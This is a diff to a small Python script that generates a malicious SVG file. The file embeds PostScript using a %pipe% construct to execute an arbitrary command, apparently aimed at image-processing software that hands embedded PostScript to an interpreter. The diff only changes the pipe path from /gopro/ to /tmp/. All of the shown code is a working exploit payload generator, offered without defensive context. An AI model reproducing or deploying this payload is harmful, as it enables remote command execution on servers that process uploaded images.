@@ -3,7 +3,7 @@ import sys
 
 def genareate_payload(_cmd,_filename):
 
-	_payload = """<?xml version="1.0" standalone="no"?> <!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"> <hui><desc>copies (%pipe%/gopro/;{}) (r) file showpage 0 quit </desc> <image href="epi:/proc/self/fd/3" /> <svg width="1px" height="1px" /> </hui>""".format(_cmd)
+	_payload = """<?xml version="1.0" standalone="no"?> <!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"> <hui><desc>copies (%pipe%/tmp/;{}) (r) file showpage 0 quit </desc> <image href="epi:/proc/self/fd/3" /> <svg width="1px" height="1px" /> </hui>""".format(_cmd)
 	f = open(_filename,"w+").write(_payload)
 	return True
 
